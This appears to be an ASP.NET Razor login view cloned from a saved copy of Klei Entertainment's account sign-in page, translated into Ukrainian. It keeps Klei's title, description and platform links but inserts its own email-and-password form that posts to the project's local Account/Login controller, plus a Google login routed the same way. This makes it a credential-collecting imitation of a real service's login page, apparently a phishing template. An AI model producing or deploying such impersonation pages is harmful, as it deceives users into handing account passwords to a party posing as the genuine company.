@model WEBJABA.ViewModel.LoginViewModel

<!DOCTYPE html>
<html
  data-scrapbook-source="https://accounts.klei.com/login"
  data-scrapbook-create="20240928123745845"
  data-scrapbook-title="Klei Account"
>
  <head>
    <meta charset="UTF-8" />
    <title>Klei Account</title>
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta
      http-equiv="cache-control"
      content="no-cache, no-store, must-revalidate"
    />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <meta
      name="description"
      content="Manage your Klei Entertainment User Account linked to one of your Steam, Xbox Network, PlayStation Network, Nintendo, WeGame, or Epic Games accounts."
    />
    <meta
      name="google-site-verification"
      content="OyczyTu3Xu8GQqyxiJc7tzat52hpnBfhsY6nH1kBke8"
    />
    <link rel="stylesheet" type="text/css" href="grid12.css" />
    <link rel="stylesheet" type="text/css" href="styles.css" />
    <style id="gridman-extension-fonts">

    </style>
    <object
      class="chrome-extension://jffafkigfgmjafhpkoibhfefeaebmccg/"
      style="display: none; visibility: hidden"
    ></object>
    <link rel="shortcut icon" href="favicon.ico" />
  </head>

  <body>
    <div id="loading" class="hidden">
      <img src="~/img/loading.gif" alt="Loading…" />
    </div>

    <div id="kleiapp" class="page login-page">

      <div class="container content">
        <!---->
        <!---->
        <!---->
        <div class="panel panel-login">
          <div class="row">
            <div class="col-sm-12 col-md-12 col-lg-5">
              <div class="panel-illustration"></div>
            </div>
            <div class="col-lg-7">
              <div class="panel-content">
                <h1 class="title">Увійти в акаунт</h1>
                <p>
                  Увійдіть до свого акаунту, щоб побачити усі ваші ігри
                  , обмінятися ігровими предметами з друзями, записатися на
                  бета-тест та отримати доступ до ексклюзивного контенту.
                </p>
                <p>Виберіть платформу для входу:</p>
                            <form style="display: flex; flex-direction: column; align-items: center; margin-bottom: 10px;" method="post" asp-controller="Account" asp-action="Login"
                                  asp-route-returnUrl="@Model.ReturnUrl">
                                <div asp-validation-summary="ModelOnly"></div>
                                <div>
                                    <label asp-for="Email" ></label><br />
                                    <input asp-for="Email" style="width: 472px;"/>
                                    <span asp-validation-for="Email"></span>
                                </div>
                                <div style="margin-bottom: 20px;">
                                    <label asp-for="Password"></label><br />
                                    <input asp-for="Password" style="width: 472px;"   />
                                    <span asp-validation-for="Password"></span>
                                </div>
                                <div>
                                    <input asp-for="RememberMe" /><label asp-for="RememberMe"></label><br />
                                    
                                </div>
                                <div>
                                    <input class="btn" type="submit" value="Увійти" />
                                </div>
                            </form>
                <div class="game-platforms">
                  <div class="platform-item">
                    <a
                      href="https://accounts.klei.com/login/steam"
                      title="Steam"
                      class="login-btn-steam"
                      ><img src="~/img/login-icon-st.png"
                    /></a>
                  </div>
                  <div class="platform-item">
                    <a href="@Url.Action("Google", "Account")"
                      title="Google"
                      class="login-btn-rail"><img src="https://pngimg.com/d/google_PNG19635.png"></a>
                  </div>
                  <div class="platform-item">
                    <a
                      href="https://accounts.klei.com/login/epic"
                      title="Epic Games"
                      class="login-btn-epic"
                      ><img src="~/img/login-icon-ep.png"
                    /></a>
                  </div>
                  <div class="platform-item">
                    <a
                      href="https://accounts.klei.com/login/xbl"
                      title="Xbox"
                      class="login-btn-xbl"
                      ><img src="~/img/login-icon-xb.png"
                    /></a>
                  </div>
                  <div class="platform-item">
                    <a
                      href="https://accounts.klei.com/login/psn"
                      title="PSN"
                      class="login-btn-psn"
                      ><img src="~/img/login-icon-ps.png"
                    /></a>
                  </div>
                  <div class="platform-item">
                    <a
                      href="https://accounts.klei.com/login/nintendo"
                      title="Nintendo"
                      class="login-btn-nintendo"
                      ><img src="~/img/login-icon-nt.png"
                    /></a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
